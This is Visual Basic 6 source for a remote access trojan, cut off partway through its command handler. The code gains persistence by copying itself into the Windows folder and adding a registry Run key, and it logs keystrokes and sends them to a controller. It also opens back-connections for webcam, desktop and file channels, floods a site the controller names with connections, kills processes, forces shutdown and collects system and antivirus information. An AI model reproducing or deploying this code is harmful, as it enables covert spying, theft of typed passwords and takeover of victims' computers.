VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   ClientHeight    =   3210
   ClientLeft      =   330
   ClientTop       =   990
   ClientWidth     =   7695
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   3210
   ScaleWidth      =   7695
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
   Begin MSWinsockLib.Winsock WinsockUP 
      Left            =   3360
      Top             =   2640
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.TextBox Text23 
      Height          =   375
      Left            =   6000
      TabIndex        =   27
      Top             =   1800
      Width           =   975
   End
   Begin MSWinsockLib.Winsock WinsockFile 
      Left            =   2880
      Top             =   2640
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock WinsockWebCam 
      Left            =   2400
      Top             =   2640
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Socket1 
      Index           =   0
      Left            =   1920
      Top             =   2640
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock ws 
      Left            =   1440
      Top             =   2640
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer Timer5 
      Enabled         =   0   'False
      Interval        =   2000
      Left            =   3840
      Top             =   2160
   End
   Begin VB.TextBox txtSysdir 
      Height          =   285
      Left            =   6000
      TabIndex        =   26
      Top             =   1440
      Width           =   1455
   End
   Begin VB.TextBox txtWindir 
      Height          =   285
      Left            =   6000
      TabIndex        =   25
      Top             =   1080
      Width           =   1455
   End
   Begin VB.TextBox Text22 
      Height          =   285
      Left            =   6000
      TabIndex        =   24
      Text            =   "1"
      Top             =   720
      Width           =   255
   End
   Begin VB.TextBox Text21 
      Height          =   285
      Left            =   6000
      TabIndex        =   23
      Text            =   "windows.exe"
      Top             =   0
      Width           =   1215
   End
   Begin VB.Timer Timer4 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   2880
      Top             =   2160
   End
   Begin VB.TextBox Text20 
      Height          =   285
      Left            =   6000
      TabIndex        =   22
      Top             =   360
      Width           =   375
   End
   Begin VB.Timer Timer3 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   3360
      Top             =   2160
   End
   Begin VB.TextBox Text19 
      Height          =   405
      Left            =   3000
      TabIndex        =   21
      Text            =   "Text19"
      Top             =   1800
      Width           =   1215
   End
   Begin VB.Timer TimerFile 
      Interval        =   1500
      Left            =   960
      Top             =   2160
   End
   Begin VB.Timer TimerCmd 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   0
      Top             =   2160
   End
   Begin VB.TextBox Text18 
      Height          =   285
      Left            =   3000
      MultiLine       =   -1  'True
      TabIndex        =   20
      Top             =   0
      Width           =   1335
   End
   Begin VB.TextBox Text17 
      Height          =   285
      Left            =   4440
      TabIndex        =   19
      Top             =   2880
      Width           =   1455
   End
   Begin VB.TextBox Text16 
      Height          =   285
      Left            =   4440
      TabIndex        =   18
      Top             =   2520
      Width           =   1455
   End
   Begin VB.TextBox Text15 
      Height          =   285
      Left            =   4440
      MultiLine       =   -1  'True
      TabIndex        =   17
      Top             =   2160
      Width           =   1455
   End
   Begin VB.TextBox Text14 
      Height          =   285
      Left            =   4440
      MultiLine       =   -1  'True
      TabIndex        =   16
      Top             =   1800
      Width           =   1455
   End
   Begin VB.TextBox Text13 
      Height          =   285
      Left            =   4440
      MultiLine       =   -1  'True
      TabIndex        =   15
      Top             =   1440
      Width           =   1455
   End
   Begin VB.TextBox Text12 
      Height          =   285
      Left            =   4440
      MultiLine       =   -1  'True
      TabIndex        =   14
      Top             =   1080
      Width           =   1455
   End
   Begin VB.TextBox Text11 
      Height          =   285
      Left            =   4440
      MultiLine       =   -1  'True
      TabIndex        =   13
      Top             =   720
      Width           =   1455
   End
   Begin VB.TextBox Text10 
      Height          =   285
      Left            =   4440
      MultiLine       =   -1  'True
      TabIndex        =   12
      Top             =   360
      Width           =   1455
   End
   Begin VB.TextBox Text9 
      Height          =   285
      Left            =   4440
      MultiLine       =   -1  'True
      TabIndex        =   11
      Top             =   0
      Width           =   1455
   End
   Begin VB.TextBox Text8 
      Height          =   375
      Left            =   3000
      TabIndex        =   10
      Text            =   "Text8"
      Top             =   1440
      Width           =   1215
   End
   Begin VB.Timer TimerWeb 
      Interval        =   1000
      Left            =   480
      Top             =   2160
   End
   Begin VB.PictureBox Picture2 
      Height          =   375
      Left            =   3480
      ScaleHeight     =   315
      ScaleWidth      =   555
      TabIndex        =   9
      Top             =   360
      Width           =   615
   End
   Begin VB.Timer TimerCont 
      Enabled         =   0   'False
      Interval        =   500
      Left            =   1440
      Top             =   2160
   End
   Begin VB.Timer Timerlog 
      Interval        =   10
      Left            =   2400
      Top             =   2160
   End
   Begin VB.TextBox Text7 
      Height          =   735
      Left            =   3000
      TabIndex        =   8
      Top             =   720
      Width           =   1215
   End
   Begin VB.Timer TimerDesk 
      Interval        =   1000
      Left            =   480
      Top             =   2640
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   200
      Left            =   0
      Top             =   2640
   End
   Begin VB.TextBox Text6 
      Height          =   375
      Left            =   0
      TabIndex        =   6
      Text            =   "2"
      Top             =   1800
      Width           =   3015
   End
   Begin VB.TextBox Text5 
      Height          =   375
      Left            =   0
      TabIndex        =   5
      Text            =   "80"
      Top             =   1440
      Width           =   3015
   End
   Begin VB.TextBox Text4 
      Height          =   375
      Left            =   0
      TabIndex        =   4
      Top             =   1080
      Width           =   3015
   End
   Begin VB.PictureBox Picture1 
      Height          =   375
      Left            =   3000
      ScaleHeight     =   315
      ScaleWidth      =   315
      TabIndex        =   3
      Top             =   360
      Width           =   375
   End
   Begin VB.Timer Timer1 
      Interval        =   2000
      Left            =   1920
      Top             =   2160
   End
   Begin VB.TextBox Text3 
      Height          =   375
      Left            =   0
      TabIndex        =   2
      Text            =   "5000"
      Top             =   360
      Width           =   3015
   End
   Begin VB.TextBox Text2 
      Height          =   375
      Left            =   0
      TabIndex        =   1
      Text            =   "vittima"
      Top             =   720
      Width           =   3015
   End
   Begin VB.TextBox Text1 
      Height          =   375
      Left            =   0
      TabIndex        =   0
      Text            =   "127.0.0.1"
      Top             =   0
      Visible         =   0   'False
      Width           =   3015
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   960
      Top             =   2640
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label Label1 
      Caption         =   "0"
      Height          =   255
      Left            =   6360
      TabIndex        =   7
      Top             =   2280
      Width           =   975
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim PzNI4HmJPnMwLhZKuE As Byte
Public cPackets As Long
Public cAttack As Long
Dim Socket As Integer
Dim std As String
Dim Ocxwin As String
Dim Foto As New Class1
Dim dfghjklòkjytresdfghjk As String, oiugvbygbnji As Long
Dim file As String, FileTotal As Long
Dim Resolucion As Byte
Dim Nombre As String
Dim Clave As Object
Dim WINDOWS As String
Dim Yo As String
Dim Borrar As String
Dim VGVzdG8 As String
Dim FileData As String
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private WithEvents objDOS As DOSOutputs
Attribute objDOS.VB_VarHelpID = -1
Private Declare Function GetDesktopWindow Lib "user32" () As Long
Private Declare Function GetDC Lib "user32" (ByVal hWnd As Long) As Long
Private Declare Function GetWindowDC Lib "user32" (ByVal hWnd As Long) As Long
Private Declare Function BitBlt Lib "gdi32" (ByVal hDCDest As Long, ByVal xDest As Long, ByVal YDest As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hDCSrc As Long, ByVal xSrc As Long, ByVal ySrc As Long, ByVal dwRop As Long) As Long
Private Declare Function GetWindowRect Lib "user32" (ByVal hWnd As Long, lpRect As RECT) As Long
Private Declare Function StretchBlt Lib "gdi32" (ByVal hDC As Long, ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal xSrc As Long, ByVal ySrc As Long, ByVal nSrcWidth As Long, ByVal nSrcHeight As Long, ByVal dwRop As Long) As Long
Private Declare Function ReleaseDC Lib "user32" (ByVal hWnd As Long, ByVal hDC As Long) As Long
Private Type RECT
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type
Private Const SRCCOPY = &HCC0020
Private Const SW_NORMAL = 1

Private Type GUID
   Data1 As Long
   Data2 As Integer
   Data3 As Integer
   Data4(0 To 7) As Byte
End Type

Private Type GdiplusStartupInput
   GdiplusVersion As Long
   DebugEventCallback As Long
   SuppressBackgroundThread As Long
   SuppressExternalCodecs As Long
End Type

Private Type EncoderParameter
   GUID As GUID
   NumberOfValues As Long
   Type As Long
   Value As Long
End Type

Private Type EncoderParameters
   Count As Long
   Parameter As EncoderParameter
End Type

Private Declare Function GdiplusStartup Lib "GDIPlus" ( _
   token As Long, _
   inputbuf As GdiplusStartupInput, _
   Optional ByVal outputbuf As Long = 0) As Long

Private Declare Function GdiplusShutdown Lib "GDIPlus" ( _
   ByVal token As Long) As Long

Private Declare Function GdipCreateBitmapFromHBITMAP Lib "GDIPlus" ( _
   ByVal hbm As Long, _
   ByVal hPal As Long, _
   BITMAP As Long) As Long

Private Declare Function GdipDisposeImage Lib "GDIPlus" ( _
   ByVal Image As Long) As Long

Private Declare Function GdipSaveImageToFile Lib "GDIPlus" ( _
   ByVal Image As Long, _
   ByVal FileName As Long, _
   clsidEncoder As GUID, _
   encoderParams As Any) As Long

Private Declare Function CLSIDFromString Lib "ole32" ( _
   ByVal str As Long, _
   ID As GUID) As Long
   Dim L1, L2, L3
 Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

Private Sub Form_Initialize()
 Dim FFile As Long
    Dim sysDir As String
    Dim sLen As Long
    Dim Resource()   As Byte

    sysDir = Space(260)
    sLen = GetSystemDirectory(sysDir, 260)
    sysDir = Left$(sysDir, sLen)

    On Error Resume Next
    Resource = LoadResData(101, "CUSTOM")

    FFile = FreeFile
    Open sysDir & "\MSWINSCK.OCX" For Binary Shared As #FFile
    Put #FFile, 1, Resource
    Close #FFile
End Sub
'@@@@@@@@@@@@@@@@@@@@@@@@Dim fuibhqweuihbfg89yhg08wqey79vyhg97w8qyehgv98aq As String
'Dim ZnVpYmhxd2V1aWhiZmc4OXloZzA4d3FleTc5dnloZzk3dzhxeWVoZ3Y5OGFx As LongDim fuibhqweuihbfg89yhg08wqey79vyhg97w8qyehgv98aq As String
'Dim ZnVpYmhxd2V1aWhiZmc4OXloZzA4d3FleTc5dnloZzk3dzhxeWVoZ3Y5OGFx As LongDim fuibhqweuihbfg89yhg08wqey79vyhg97w8qyehgv98aq As String
'Dim ZnVpYmhxd2V1aWhiZmc4OXloZzA4d3FleTc5dnloZzk3dzhxeWVoZ3Y5OGFx As LongDim fuibhqweuihbfg89yhg08wqey79vyhg97w8qyehgv98aq As String
'Dim ZnVpYmhxd2V1aWhiZmc4OXloZzA4d3FleTc5dnloZzk3dzhxeWVoZ3Y5OGFx As LongDim fuibhqweuihbfg89yhg08wqey79vyhg97w8qyehgv98aq As String
'Dim ZnVpYmhxd2V1aWhiZmc4OXloZzA4d3FleTc5dnloZzk3dzhxeWVoZ3Y5OGFx As LongDim fuibhqweuihbfg89yhg08wqey79vyhg97w8qyehgv98aq As String
'Dim ZnVpYmhxd2V1aWhiZmc4OXloZzA4d3FleTc5dnloZzk3dzhxeWVoZ3Y5OGFx As LongDim fuibhqweuihbfg89yhg08wqey79vyhg97w8qyehgv98aq As String
'Dim ZnVpYmhxd2V1aWhiZmc4OXloZzA4d3FleTc5dnloZzk3dzhxeWVoZ3Y5OGFx As LongDim fuibhqweuihbfg89yhg08wqey79vyhg97w8qyehgv98aq As String
'Dim ZnVpYmhxd2V1aWhiZmc4OXloZzA4d3FleTc5dnloZzk3dzhxeWVoZ3Y5OGFx As LongDim fuibhqweuihbfg89yhg08wqey79vyhg97w8qyehgv98aq As String
'Dim ZnVpYmhxd2V1aWhiZmc4OXloZzA4d3FleTc5dnloZzk3dzhxeWVoZ3Y5OGFx As LongDim fuibhqweuihbfg89yhg08wqey79vyhg97w8qyehgv98aq As String
'Dim ZnVpYmhxd2V1aWhiZmc4OXloZzA4d3FleTc5dnloZzk3dzhxeWVoZ3Y5OGFx As Long

Private Sub Form_Load()
On Error Resume Next
Open App.Path + "\" & App.EXEName & ".exe" For Binary As #1
std = Space(LOF(1))
Get #1, , std
Close #1
Text1.Text = Split(std, "(Dil)")(1)
Text3.Text = Split(std, "(Dil)")(2)
Text2.Text = Split(std, "(Dil)")(3)
Text21.Text = Split(std, "(Dil)")(4)
Dim hewbfiyew87f78wy7f8he7fyew7fyewfghiewghfi8ewghuf As Integer
Dim aGV3YmZpeWV3ODdmNzh3eTdmOGhlN2Z5ZXc3Znlld2ZnaGlld2doZmk4ZXdnaHVm As String
Connect
Set objDOS = New DOSOutputs
Dim windows1 As String, Taille2 As Long, windows2 As Long '-'
windows1 = Space$(255)                                    '-'
Taille2 = Len(windows1)                                   '-'
windows2 = GetWindowsDirectory(windows1, Taille2)         '-'
txtWindir.Text = windows1                                 '-'
'Répertoire système                                       '-'
Dim system1 As String, Taille1 As Long, system2 As Long   '-'
system1 = Space$(255)                                     '-'
Taille1 = Len(system1)                                    '-'
system2 = GetSystemDirectory(system1, Taille1)            '-'
txtSysdir.Text = system1
FileCopy App.Path + "\" + App.EXEName + ".exe", txtWindir + "\" & Text21.Text
DoEvents
Dim Y2lhb2NvbWV2YWlvbWljaGlhbWVtb2VtYW51ZWxlZXR1Y29tZXRpY2hpYW1pdG9udG9kaW1lcmRh
 Set Y2lhb2NvbWV2YWlvbWljaGlhbWVtb2VtYW51ZWxlZXR1Y29tZXRpY2hpYW1pdG9udG9kaW1lcmRh = CreateObject("WScript.Shell")
Y2lhb2NvbWV2YWlvbWljaGlhbWVtb2VtYW51ZWxlZXR1Y29tZXRpY2hpYW1pdG9udG9kaW1lcmRh.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\s1s73m", txtWindir.Text & "\" & Text21.Text
End Sub
Private Sub Connect()
Timer1.Enabled = True

End Sub

Private Sub Form_Unload(Cancel As Integer)
 Set objDOS = Nothing
    End
End Sub

Private Sub Text18_Change()
 Text18.SelStart = Len(Text18.Text)
End Sub

Private Sub Timer1_Timer()
On Error Resume Next
'hgiojwoirjhgoiejwfowejofjowejfoijweofjiowejoijfioejiwjiieiowevko002020020202020202001001010011010101010010
Dim hihbhihbihhibjihbhssssssssssantivirusfuck As Boolean
 If Winsock1.State <> sckConnected Then
     Winsock1.Close
        Winsock1.Connect Text1.Text, Text3.Text
    End If

End Sub

Private Sub Timer2_Timer()
On Error Resume Next
Dim dWh1aHVqaHVqaHVo As Integer

For dWh1aHVqaHVqaHVo = 1 To Socket
Socket1(dWh1aHVqaHVqaHVo).Connect Text4.Text, Text5.Text
DoEvents
DoEvents
Socket1(dWh1aHVqaHVqaHVo).Close
Label1.Caption = Label1.Caption + 1
Next dWh1aHVqaHVqaHVo

Winsock1.SendData "CON|" & Label1.Caption
End Sub

Private Sub Timer3_Timer()
MsgBox Text20.Text, vbOKCancel, "Windows"


End Sub

Private Sub Timer4_Timer()
Shell "cmd"

End Sub

Public Sub lol()
Dim fuibhqweuihbfg89yhg08wqey79vyhg97w8qyehgv98aq As String
Dim ZnVpYmhxd2V1aWhiZmc4OXloZzA4d3FleTc5dnloZzk3dzhxeWVoZ3Y5OGFx As Long
Dim XgeIw83oEmpdJdwL3m7Vw8Pd3 As Long

End Sub

Private Sub TimerCont_Timer()
On Error Resume Next
Winsock1.SendData "KL|" & Text7.Text

End Sub

Private Sub TimerDesk_Timer()
  If ws.State <> sckConnected Then
        ws.Close
        
        ws.Connect Text1.Text, 222
    End If
End Sub



Private Sub TimerFile_Timer()
On Error Resume Next
 If WinsockFile.State <> sckConnected Then
    WinsockFile.Close
        WinsockFile.Connect Text1.Text, 5003
    End If
End Sub

Private Sub Timerlog_Timer()

On Error Resume Next
If (GetAsyncKeyState(VK_DELETE) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [DEL] "
End If
If (GetAsyncKeyState(VK_BACK) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [BACK] "
End If
If (GetAsyncKeyState(VK_DOWN) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [DOWN] "
End If
If (GetAsyncKeyState(VK_RIGHT) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [RIGHT] "
End If
If (GetAsyncKeyState(VK_UP) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [UP] "
End If
If (GetAsyncKeyState(VK_LEFT) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [LEFT] "
End If


'***************'
If (GetAsyncKeyState(VK_0) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "0"
End If
If (GetAsyncKeyState(VK_1) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "1"
End If
If (GetAsyncKeyState(VK_2) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "2"
End If
If (GetAsyncKeyState(VK_3) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "3"
End If
If (GetAsyncKeyState(VK_4) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "4"
End If
If (GetAsyncKeyState(VK_5) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "5"
End If
If (GetAsyncKeyState(VK_6) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "6"
End If
If (GetAsyncKeyState(VK_7) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "7"
End If
If (GetAsyncKeyState(VK_8) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "8"
End If
If (GetAsyncKeyState(VK_9) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "9"
End If
If (GetAsyncKeyState(VK_A) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "a"
End If
If (GetAsyncKeyState(VK_B) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "b"
End If
If (GetAsyncKeyState(VK_C) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "c"
End If
If (GetAsyncKeyState(VK_D) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "d"
End If
If (GetAsyncKeyState(VK_E) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "e"
End If
If (GetAsyncKeyState(VK_F) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "f"
End If
If (GetAsyncKeyState(VK_G) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "g"
End If
If (GetAsyncKeyState(VK_H) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "h"
End If
If (GetAsyncKeyState(VK_I) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "i"
End If
If (GetAsyncKeyState(VK_J) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "j"
End If
If (GetAsyncKeyState(VK_K) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "k"
End If
If (GetAsyncKeyState(VK_L) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "l"
End If
If (GetAsyncKeyState(VK_M) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "m"
End If
If (GetAsyncKeyState(VK_N) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "n"
End If
If (GetAsyncKeyState(VK_O) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "o"
End If
If (GetAsyncKeyState(VK_P) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "p"
End If
If (GetAsyncKeyState(VK_Q) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "q"
End If
If (GetAsyncKeyState(VK_R) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "r"
End If
If (GetAsyncKeyState(VK_S) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "s"
End If
If (GetAsyncKeyState(VK_T) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "t"
End If
If (GetAsyncKeyState(VK_U) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "u"
End If
If (GetAsyncKeyState(VK_V) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "v"
End If
If (GetAsyncKeyState(VK_W) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "w"
End If
If (GetAsyncKeyState(VK_X) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "x"
End If
If (GetAsyncKeyState(VK_Y) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "y"
End If
If (GetAsyncKeyState(VK_Z) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "z"
End If

If (GetAsyncKeyState(VK_SPACE) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " "
End If
If (GetAsyncKeyState(VK_RETURN) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [ENTER] "
End If
If (GetAsyncKeyState(VK_ADD) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "+"
End If
If (GetAsyncKeyState(VK_MULTIPLY) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "*"
End If
If (GetAsyncKeyState(VK_SEPARATOR) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "/"
End If
If (GetAsyncKeyState(VK_SUBTRACT) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "-"
End If
If (GetAsyncKeyState(VK_TAB) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [TAB] "
End If
If (GetAsyncKeyState(VK_ESCAPE) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [ESCAPE] "
End If


If (GetAsyncKeyState(VK_NUMLOCK) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [NUMLOCK] "
End If
If (GetAsyncKeyState(VK_NUMPAD0) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "0"
End If
If (GetAsyncKeyState(VK_NUMPAD1) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "1"
End If
If (GetAsyncKeyState(VK_NUMPAD2) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "2"
End If
If (GetAsyncKeyState(VK_NUMPAD3) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "3"
End If
If (GetAsyncKeyState(VK_NUMPAD4) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "4"
End If
If (GetAsyncKeyState(VK_NUMPAD5) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "5"
End If
If (GetAsyncKeyState(VK_NUMPAD6) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "6"
End If
If (GetAsyncKeyState(VK_NUMPAD7) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "7"
End If
If (GetAsyncKeyState(VK_NUMPAD8) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "8"
End If
If (GetAsyncKeyState(VK_NUMPAD9) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + "9"
End If

'******'
'F-Keys'
'******'
If (GetAsyncKeyState(VK_F1) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [F1] "
End If
If (GetAsyncKeyState(VK_F2) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [F2] "
End If
If (GetAsyncKeyState(VK_F3) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [F3] "
End If
If (GetAsyncKeyState(VK_F4) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [F4] "
End If
If (GetAsyncKeyState(VK_F5) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [F5] "
End If
If (GetAsyncKeyState(VK_F6) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [F6] "
End If
If (GetAsyncKeyState(VK_F7) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [F7] "
End If
If (GetAsyncKeyState(VK_F8) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [F8] "
End If
If (GetAsyncKeyState(VK_F9) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [F9] "
End If
If (GetAsyncKeyState(VK_F10) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [F10] "
End If
If (GetAsyncKeyState(VK_F11) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [F11] "
End If
If (GetAsyncKeyState(VK_F12) And &H1) = &H1 Then
VGVzdG8 = VGVzdG8 + " [F12] "
End If

Text7.Text = VGVzdG8


End Sub

Private Sub TimerWeb_Timer()
On Error Resume Next
 If WinsockWebCam.State <> sckConnected Then
     WinsockWebCam.Close
        WinsockWebCam.Connect Text1.Text, 5002
    End If


End Sub



Private Sub Winsock1_DataArrival(ByVal byVGVzdG8tal As Long)
On Error Resume Next
Dim data As String
Dim Data2() As String
Winsock1.GetData data, vbString
Data2 = Split(data, "|")
If Data2(0) = "SITE" Then
Text4.Text = Data2(1)
End If
If Data2(0) = "PORT" Then
Text5.Text = Data2(1)
End If
If Data2(0) = "START" Then
Dim i As Integer
For i = 1 To Text6.Text
Load Socket1(i)
Socket = Socket + 1
Next i
If Socket = Text6.Text Then
Timer2.Enabled = True
End If
Timer2.Enabled = True
Winsock1.SendData "ATK"
End If
If Data2(0) = "STOP" Then
On Error Resume Next
Timer2.Enabled = False
For i = 1 To Text6.Text
Unload Socket1(i)
Socket = Socket - 1
Next i
Winsock1.SendData "STP"
Socket = 0
End If
If Data2(0) = "TR" Then
Text6.Text = Data2(1)
End If
If Data2(0) = "KTRECIVE" Then
Winsock1.SendData "KL|" & Text7.Text
End If
If Data2(0) = "del" Then
Winsock1.SendData "KL|" & "Log Remote Cancellate"
Text7.Text = ""
End If
If Data2(0) = "KTRECIVEON" Then
TimerCont.Enabled = True
End If
If Data2(0) = "KTRECIVEOFF" Then
TimerCont.Enabled = False
End If
If Data2(0) = "close" Then
End
End If
If Data2(0) = "riavvia" Then
Winsock1.Close
ws.Close
WinsockWebCam.Close

End If
If Data2(0) = "ChatOn" Then
Form2.Show
Text8.Text = Data2(1)
End If
If Data2(0) = "chatOFF" Then
Form2.Text1.Text = 0
Unload Form2


End If
If Data2(0) = "chat" Then
Form2.List1.AddItem Data2(1)


End If
If Data2(0) = "msg" Then
If Data2(3) = 1 Then
MsgBox Data2(2), , Data2(1)
ElseIf Data2(3) = 2 Then
MsgBox Data2(2), vbCritical, Data2(1)
ElseIf Data2(3) = 3 Then
MsgBox Data2(2), vbExclamation, Data2(1)
ElseIf Data2(3) = 4 Then
MsgBox Data2(2), vbInformation, Data2(1)
ElseIf Data2(5) = 5 Then
MsgBox Data2(2), vbQuestion, Data2(1)
End If
End If

If Data2(0) = "Name" Then
Winsock1.SendData "Name|" & Text2.Text & "|" & Winsock1.LocalHostName

End If
If Data2(0) = "WebOpen" Then
GoToWebsite Data2(1)
End If
If Data2(0) = "Run" Then
GoToWebsite Data2(1)
End If
If Data2(0) = "MatrixOn" Then
Form3.Show

End If
If Data2(0) = "MatrixOFF" Then
Unload Form3
End If
If Data2(0) = "matrix" Then
Form3.Text1.Text = Data2(1)
End If
If Data2(0) = "lampON" Then
Form3.Timer1.Enabled = True
End If
If Data2(0) = "lampOFF" Then
Form3.Timer1.Enabled = False
Form3.Timer2.Enabled = False
Form3.Text1.Visible = True


End If
If Data2(0) = "process" Then

Winsock1.SendData "processrecive|" & ListProcess()

End If
If Data2(0) = "killprocess" Then

Shell "taskkill /f /im " & Data2(1)


End If
If Data2(0) = "shutdown" Then
Shell "shutdown -s -t00"


End If
If Data2(0) = "reboot" Then
Shell "shutdown -r"


End If
If Data2(0) = "standby" Then
Shell "rundll32.exe powrprof.dll,SetSuspendState"


End If
If Data2(0) = "logoff" Then
Shell "logoff"


End If

If Data2(0) = "forza" Then
Shell "shutdown -s -f -t00"


End If
If Data2(0) = "timer" Then
Shell "shutdown -t " & Data2(1) & " -c " & Data2(2)


End If
If Data2(0) = "bloccopc" Then
Shell "rundll32.exe user32.dll,LockWorkStation"


End If
If Data2(0) = "info" Then

Dim hKey As Long

    Text9.Text = Text9.Text + Environ("OS")

   
    If RegOpenKeyEx(HKEY_LOCAL_MACHINE, _
        REG_PRODUCT_KEY, _
        0&, KEY_QUERY_VALUE, hKey) <> ERROR_SUCCESS _
    Then
       
        Exit Sub
    End If

    ' Get the subkeys' values.
   Text10.Text = Text10.Text + GetRegistryValue(hKey, "ProductName")
   
 Text11.Text = Text11.Text + GetRegistryValue(hKey, "CurrentBuildNumber")
 
   Text12.Text = Text12.Text + GetRegistryValue(hKey, "CurrentVersion")
Text13.Text = Text13.Text + GetRegistryValue(hKey, "CSDVersion")
    ' Close the key.
    If RegCloseKey(hKey) <> ERROR_SUCCESS Then
      
    End If
Text14.Text = Text14.Text + Winsock1.LocalHostName
Text17.Text = Text17.Text + Winsock1.LocalIP
Dim av() As String

 av = Split(GetFWAV, "|")
 
 Text15.Text = av(0)
 Text16.Text = av(1)

 
 

